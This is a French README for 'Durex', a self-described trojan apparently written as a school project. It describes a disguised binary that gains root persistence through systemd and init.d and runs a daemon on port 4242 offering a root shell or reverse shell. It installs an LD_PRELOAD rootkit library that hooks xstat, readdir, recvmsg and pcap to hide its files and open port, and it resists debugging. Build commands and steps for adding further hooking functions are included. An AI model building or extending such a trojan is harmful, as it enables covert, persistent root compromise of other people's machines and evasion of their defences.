# DUREX

Ce projet a pour but de créer un simple trojan !

## INFOS

Durex est un binaire qui affichera l'utilisateur actuellement connecté.
NEANMOINS, en fond, il aura fait bieeeeen plus de choses, uniquement avec les droits root :
* Durex créera un autre programme dans /bin qui se nommera également Durex.
* Durex créera les fichiers Durex, Durex.conf et Durex.service, dans les répertoires /etc/init.d, /etc/systemd et /lib/systemd/system, respectivement, permetant au programme nouvellement créer de s'excuter au démarrage de la machine cible.
* Ce même programme sera lancé en tâche de fond à la façon d’un daemon.
* Une seule instance du daemon ne peut être lancée.

NEANMOINS, au moment de l'installation Durex modifiera sa copie pour exécuter d'autre fonction dont voici l'exécution:
* Le daemon créera une librairie personnalisé dans le but de rendre le binaire et ses actions indétectable. Nommée Durex.so la librairie s'installera dans /usr/local/lib et s'incrira dans le fichier /etc/ld.so.preload.
Le seul moyen de pouvoir redétecter le binaire sera de supprimer ce dernier fichier. J'ai intentionnelement laissé la possibilité de le faire pour ce projet.
* Le daemon écoutera le port 4242.
* Il propose une connexion à 3 clients en simultané.
* Lors de la connexion d’un client sur le daemon, un mot de passe est demandé.
Un minimum de sécurité sur le mot de passe est assuré. Un exécutable est a disposition pour générer l'hexadécimal du mot de passe que vous voulez mettre en place (voir plus bas).
* Lorsque la connexion est établie avec un client, le daemon propose de lancer un shell avec les droits root, ou un reverse shell toujours avec les droits root.

BONUS:
* Chaque action d'un utilisateur est repertorié dans le fichier /var/log/Durex.log.
* Optimisation dans le but de rendre tous les fichiers créer par l'exécutable indétectable. (/bin/Durex, /etc/ld.so.preload, /usr/lib/Durex.so, /var/lock/Durex.lock, /var/log/Durex.log)
* Optimisation dans le but de camoufler l'ouverture du port 4242.
* Optmisation dans le but de rendre l'exécutable impossible à debugger/analyser.

### Le binaire a été testé sur une Debian 9.3.0 64bits.

## INSTALLATION
### Durex

```
make && ./Durex
```

## MODIFICATION
### Password generation

```
make pass
./pass [mot_de_passe]
```

Utiliser ensuite votre meilleur éditeur pour modifier le fichier **durex.h** :
```
# define SERVER_PASS .. .. .. .. ..
```

##### Exemples

```
root@debian:/home/XXX/42/durex# make pass
cc -o pass other/passwd.c srcs/encrypt.c -I includes/
root@debian:/home/XXX/42/durex# ./pass toto
toto (4): 191 248 92 67 189 94 197 184
root@debian:/home/XXX/42/durex# ./pass kata
kata (4): 201 121 30 74 3 83 154 250
```

### Ajout de fonction dans la libraire

* Créer votre fichier et compiler le
```
gcc -Wall -fPIC -shared -o ./Durex.so [fichier.c] -ldl
```
* Si tout se passe bien, créer le binaire hex et copier l'hexadecimal de votre fichier
```
make hex && ./hex [fichier.c]
```
* AJouter l'hexa affiché dans le fichier includes/main.h et prenant exemple sur ceux deja mis en place :
```
# define DUREX_XSTAT_FILE		"/tmp/xstat.c"
# define DUREX_XSTAT_SRC		"\x23\x64\x65\x66..."
```
* Ajouter enfin vos #define dans le fichier /srcs/library.c en suivant la logique deja mise en place :
```
int				install_library()
{
	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
							 DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
							 DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
							 DUREX_RM_FILE, DUREX_XSTAT_FILE,
							 "-ldl", NULL };
	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
							 DUREX_RM_SRC, DUREX_XSTAT_SRC };
   ...
}
```
* Redemarez l'exécutable en prenant soin de faire les bonnes manipulations (le binaire est ineffaçable btw !)
```
make rt
```
* Votre fonction est maintenant intégré au binaire

#### ATTENTION
Toute fonction intégrée à la librairie sera exécuter sur tous les binaires utilisant cette même fonction.
Par exemple:
La librairie actuelle modifie le comportement de l'appel système xstat(...), du coup tous les binaires utilisant xstat (ls, find, grep, etc.) utiliseront votre fonction.

# AUTEUR
* gbourgeo
